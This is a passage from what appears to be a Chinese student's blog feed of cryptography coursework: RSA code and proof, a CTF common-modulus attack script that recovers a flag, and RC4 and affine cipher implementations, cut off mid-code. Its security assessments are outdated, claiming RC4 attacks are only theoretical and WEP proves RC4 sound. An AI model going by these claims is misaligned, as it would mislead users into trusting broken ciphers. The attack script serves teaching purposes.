class="line">group_cipher=RSAencrypt_group(temp,e,n)</span><br><span class="line">cip.append(group_cipher)</span><br><span class="line">res+=str(group_cipher)</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="解密一组"><a href="#解密一组" class="headerlink" title="解密一组"></a>解密一组</h3><p>输入数字c进行RSA解密得到num1，然后再转化为16进制，再对16进制数进行解码变成明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_group</span><span class="params">(c,e,n,ol)</span>:</span></span><br><span class="line">d=gmpy2.invert(e,ol)</span><br><span class="line">num1=pow(c,d,n)</span><br><span class="line">str1=<span class="string">'&#123;:0x&#125;'</span>.format(num1)</span><br><span class="line">plain=hexdecode(str1)</span><br><span class="line"><span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><h3 id="解密全部"><a href="#解密全部" class="headerlink" title="解密全部"></a>解密全部</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAdecrypt_all</span><span class="params">(e,n,ol)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)):</span><br><span class="line">temp=RSAdecrypt_group(cip[i],e,n,ol)</span><br><span class="line">res+=temp</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性验证"><a href="#运行结果及正确性验证" class="headerlink" title="运行结果及正确性验证"></a>运行结果及正确性验证</h2><p><strong>理论证明：</strong></p><p>即我们要证<code>n^ed≡n(modN)</code>，已知<code>ed≡1modϕ(N)</code>，那么 <code>ed=kϕ(N)+1</code>，即需要证明</p><p><code>n^(kϕ(N)+1)≡n(modN)</code></p><p>这里我们分两种情况证明</p><p>第一种情况 gcd(n,N)=1，那么 <code>n^ϕ(N)≡1modN</code>，因此原式成立。</p><p>第二种情况 gcd(n,N)!=1，那么 n 必然是 p 或者 q 的倍数，并且 n 小于 N。我们假设<code>n=xp</code></p><p>那么 x 必然小于 q，又由于 q 是素数。那么<code>n^ϕ(q)≡1modq</code></p><p>进而<code>n^kϕ(N)=n^(k(p−1)(q−1))=(n^ϕ(q))^k(p−1)≡1modq</code></p><p>那么<code>n^(kϕ(N)+1)=n+uqn</code>进而<code>nkϕ(N)+1=n+uqxp=n+uxN</code>；所以原式成立。</p><p><strong>程序正确性：</strong></p><p>程序输入明文hello，加载出1024bit的大素数p和q，继续加载出公钥e，经过加密得到如下密文；就用上面得到的p,q,e,cipher，先计算出私钥d，再解密密文，得到如下明文hello，解密成功，算法正确性得到验证；</p><p><img src="https://s2.ax1x.com/2019/01/03/Fo8GnI.png" alt="Fo8GnI.png"></p><h2 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h2><p>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破，RSA算法选取的两个安全的大素数目前推荐长度为至少为1024比特；到现在为止，还没有任何可靠的攻击 RSA 算法的方式。</p><h3 id="RSA的共模攻击分析"><a href="#RSA的共模攻击分析" class="headerlink" title="RSA的共模攻击分析"></a>RSA的共模攻击分析</h3><h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击；</p><p>设两个用户的公钥分别为 e1和 e2，且两者互质。明文消息为 mm，密文分别为：<code>c1=m^e1(modN)</code> <code>c2=m^e2(modN)</code></p><p>当攻击者截获 c1和 c2后，就可以恢复出明文。用扩展欧几里得算法求出 <code>re1+se2=1modn</code>的两个整数 r 和 s，由此可得：</p><p><code>(c^r1)*(c^s2)≡(m^re1)*(m^se2)modn≡m^(re1+se2)modn≡m(modn)</code></p><h5 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h5><p>就拿CTF比赛Crypto中的一道题目来说：给出两组密文 message1,message2；给出两组分别的公钥是e1和e2；给出两组加密用的是同一个n；如何去计算出明文呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;</span><br><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;</span><br><span class="line">message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br></pre></td></tr></table></figure><p>可以看出两个公钥的 N 是一样的，并且两者的 e 互素。用上述原理写一个python脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span></span><br><span class="line">e1 = <span class="number">773</span></span><br><span class="line">e2 = <span class="number">839</span></span><br><span class="line">message1=<span class="number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span></span><br><span class="line">message2=<span class="number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><p>得出结果明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure><p>这时候需要考虑当时明文是如何转化为这个数字了，这个应该是 ASCII 字符转换，进而我们使用如下代码得到 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">plain = str(plain)</span><br><span class="line"><span class="keyword">while</span> i &lt; len(plain):</span><br><span class="line">    <span class="keyword">if</span> plain[i] == <span class="string">'1'</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">3</span>]))</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(int(plain[i:i + <span class="number">2</span>]))</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">###flag&#123;whenwethinkitispossible&#125;###</span></span><br></pre></td></tr></table></figure><h2 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h2><p>公钥加密中密钥1024bit的密钥强度只能相当于对称加密中几十bit的强度，而且密钥的生成需要时间，所以还是对称加密的效率较高，而且耗时较短，速度比较快；一般通信中采用的就是明文采用对称加密的方法发出，而加解密密钥用公钥加密体制加密后发给接收方，这样效率会比较高；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;你知道什么叫非对称吗？
    
    </summary>
    
      <category term="密码学学习" scheme="https://gardenia30.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之RC4序列密码</title>
    <link href="https://gardenia30.top/2019/01/13/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4/"/>
    <id>https://gardenia30.top/2019/01/13/序列密码之RC4/</id>
    <published>2019-01-13T11:36:48.000Z</published>
    <updated>2019-04-09T09:24:41.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RC4比较简单，放篇实验报告水一波(滑稽脸)<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="序列密码之RC4算法"><a href="#序列密码之RC4算法" class="headerlink" title="序列密码之RC4算法"></a>序列密码之RC4算法</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>在密码学中，<strong>RC4</strong>是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4软件容易实现，密钥长度可变，简单，但也很有效果。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>RC4主要分为三个步骤，初始化 S 和 T 数组，初始化置换 S，生成密钥流。</p><h4 id="初始化S盒和T向量（初始化S和T）"><a href="#初始化S盒和T向量（初始化S和T）" class="headerlink" title="初始化S盒和T向量（初始化S和T）"></a>初始化S盒和T向量（初始化S和T）</h4><p>先初始化S，同时建立一个临时数组向量T，如果种子密钥的长度为256字节，则直接将K赋值给T，否则若种子密钥K的长度小于256，则将K的值赋给T的前|K|个元素，并不断重复加载K的值直到T被填满。将S和T分别存储在列表S1和T1里；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br></pre></td></tr></table></figure><h4 id="KSA密钥调度算法（置换S）"><a href="#KSA密钥调度算法（置换S）" class="headerlink" title="KSA密钥调度算法（置换S）"></a>KSA密钥调度算法（置换S）</h4><p>用来打乱S盒的初始排列顺序；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br></pre></td></tr></table></figure><h4 id="PRGA伪随机生成算法（生成密钥流）"><a href="#PRGA伪随机生成算法（生成密钥流）" class="headerlink" title="PRGA伪随机生成算法（生成密钥流）"></a>PRGA伪随机生成算法（生成密钥流）</h4><p>生成密钥流存储在flow1列表中；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t])</span><br></pre></td></tr></table></figure><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>将密钥流与明文字节异或得出密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>将密钥流与密文字节异或得出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br></pre></td></tr></table></figure><h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_S_T</span><span class="params">(s1,t1,k1)</span>:</span>    </span><br><span class="line"><span class="string">"""初始化S,T"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s1.append(i)</span><br><span class="line">t1.append(k1[i%len(k1)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_s</span><span class="params">(s2,t2)</span>:</span></span><br><span class="line"><span class="string">"""更新S"""</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j=(j+s2[i]+t2[i])%<span class="number">256</span></span><br><span class="line">s2[i],s2[j]=s2[j],s2[i]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_flow</span><span class="params">(s3,p1,flow1)</span>:</span></span><br><span class="line"><span class="string">"""生成密钥流"""</span>  </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(p1)):</span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">j=(j+s3[i])%<span class="number">256</span></span><br><span class="line">s3[i],s3[j]=s3[j],s3[i]</span><br><span class="line">t=(s3[i]+s3[j])%<span class="number">256</span></span><br><span class="line">flow1.append(s3[t]) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plain_flow</span><span class="params">(p2,flow2,c)</span>:</span></span><br><span class="line"><span class="string">"""生成密文"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p2)):</span><br><span class="line">temp=(flow2[i]^ord(p2[i]))</span><br><span class="line">temp1=hex(temp)</span><br><span class="line">c.append(temp1[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rc4</span><span class="params">(c1,flow3,p_flow)</span>:</span></span><br><span class="line"><span class="string">"""解密"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">temp2=int(<span class="string">"0x"</span>+c1[i],<span class="number">16</span>)</span><br><span class="line">p_flow.append(chr(flow3[i]^temp2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encrypt Input  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">k=raw_input(<span class="string">"Please enter the key:"</span>)</span><br><span class="line">key=k.split(<span class="string">" "</span>)</span><br><span class="line">key=[int(key[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key))]</span><br><span class="line">plain=raw_input(<span class="string">"Please enter the plain:"</span>)</span><br><span class="line">s=[] </span><br><span class="line">t=[] </span><br><span class="line">k_flow=[] </span><br><span class="line">c_flow=[]</span><br><span class="line">p_flow=[]</span><br><span class="line">init_S_T(s,t,key) </span><br><span class="line">update_s(s,t)</span><br><span class="line">secret_flow(s,plain,k_flow)</span><br><span class="line">plain_flow(plain,k_flow,c_flow)</span><br><span class="line"><span class="keyword">print</span> <span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Encryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line"><span class="comment"># print("置乱后的s盒：")</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">print(<span class="string">"密钥流："</span>)</span><br><span class="line">print(k_flow)</span><br><span class="line">print(<span class="string">"Cipher:"</span>)</span><br><span class="line"><span class="comment"># print c_flow</span></span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(c_flow)   <span class="comment">#加密后输出密文</span></span><br><span class="line">decode_rc4(c_flow,k_flow,p_flow)          <span class="comment">#解密后输出明文</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">"  Decryption  "</span>+<span class="number">8</span>*<span class="string">"*"</span></span><br><span class="line">print(<span class="string">"Plain:"</span>)</span><br><span class="line"><span class="keyword">print</span><span class="string">""</span>.join(p_flow)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="运行结果及正确性"><a href="#运行结果及正确性" class="headerlink" title="运行结果及正确性"></a>运行结果及正确性</h3><p>输入8个字符的明文化成ASCII码，再转化为比特流，与得到的密钥比特流进行逐位异或，结果化成16进制得到如下密文；将密文化为比特流再与原来的密钥流进行异或，得到明文比特流，继续转化为字符得到原来的字符hellocumt；所以算法正确性得到了验证；</p><p><img src="https://s2.ax1x.com/2019/01/02/FINa2F.png" alt="FINa2F.png"></p><h3 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h3><p>设计流密码的一个重要步骤就是设计密钥流生成器，主要安全要求就是：</p><p>1.密钥流的周期要足够大；</p><p>2.还要使得密钥流具有随机统计特性；</p><p>3.密钥流的部分暴露时，序列不可被推算出来，就是序列的线性不可预测性大；</p><p>一般来说，密钥序列的随机特性越好，加密的安全性也就越高；RC4的密钥生成随机特性良好，周期足够大；至今对RC4的攻击都停留在理论上，在实践上并不能对RC4构成威胁；</p><h3 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h3><p>由于RC4具有良好的随机特性和抵抗各种分析的能力，密钥流随机特性较好，因此在众多领域里RC4都得到了广泛的运用；例如：无线局域网标准的WEP协议就是利用RC4对数据进行加密，保障了无线通信信号的完整性和保密性，防止了不法分子对网络的非授权访问；这样的现实应用直接证实了RC4算法的有效性和合理性；</p><h3 id="算法编写过程中遇到的问题及解决"><a href="#算法编写过程中遇到的问题及解决" class="headerlink" title="算法编写过程中遇到的问题及解决"></a>算法编写过程中遇到的问题及解决</h3><p>编写过程中一开始解密不对，经过学习发现是一个简单的错误，那就是序列密码是对称加密算法，加密解密需要用到相同的密钥，所以每次如果明文和种子密钥不一样的话，解密都需要更新自己的密钥流；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;RC4比较简单，放篇实验报告水一波(滑稽脸)
    
    </summary>
    
      <category term="密码学学习" scheme="https://gardenia30.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>密码学课程设计之仿射加密</title>
    <link href="https://gardenia30.top/2019/01/13/%E4%BB%BF%E5%B0%84%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/01/13/仿射加密学习笔记/</id>
    <published>2019-01-13T11:11:51.000Z</published>
    <updated>2019-04-09T09:25:51.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于放假了，整理一波之前密码学的报告和笔记<a id="more"></a>；</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>仿射密码，是古典密码里面比较经典的替换密码，在我看来就是将移位密码和数乘密码结合到了一起；</p><p>加密方程：<code>C=(k1*M+k2)mod26</code>；</p><p>解密方程：<code>M=(C-k2)*(k1^-1)mod26</code>；</p><p>其中k1必须与26互素，这样才可以产生k1的逆元用于解密；没有对k1的限制，可能无法解密。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p>这里的p为需要加密的明文，k1,k2就是上述的两个密钥，先看明文需要加密几个字母，有几个字母就产生几轮循环，每次循环将字母先转换为0~25的数字，然后进行数乘和移位变换，然后再转换为字符，存储在一个字符变量c中，直到循环结束为止，这就得到了密文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fangshe</span><span class="params">(p,k1,k2)</span>:</span></span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)):</span><br><span class="line">temp=chr((((ord(p[i])-ord(<span class="string">'a'</span>))*k1+k2)%<span class="number">26</span>)+ord(<span class="string">'a'</span>))</span><br><span class="line">c+=temp</span><br><span class="line"><span class="keyword">return</span> c</span><br></pre></td></tr></table></figure><h3 id="判断最大公因数"><a href="#判断最大公因数" class="headerlink" title="判断最大公因数"></a>判断最大公因数</h3><p>如果需要解密，则必须要使得k1能够产生对26的逆元，即要使k1和26互素，所以判断k1和26是否最大公约数为1;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#判断最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(x,y)</span>:</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">temp=y</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">temp=x</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,temp+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span>((x%i==<span class="number">0</span>) <span class="keyword">and</span> (y%i==<span class="number">0</span>)):</span><br><span class="line">s=i</span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><p>解密首先要判断k1和26是否互素，互素才可以解密，在互素的前提下计算k1对于26的逆元：k1_re，然后用解密放生进行循环解密即可输出明文；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#仿射解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(a,b,str1)</span>:</span></span><br><span class="line">c1=<span class="string">""</span></span><br><span class="line"><span class="keyword">if</span>(gcd(a,<span class="number">26</span>)==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span>((a*i)%<span class="number">26</span>==<span class="number">1</span>):</span><br><span class="line">k1_re=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">temp=chr((((ord(str1[i])-ord(<span class="string">'a'</span>))-b)*k1_re)%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">c1+=temp</span><br><span class="line"><span class="keyword">return</span> c1</span><br></pre></td></tr></table></figure><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>刚写python，比较丑……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 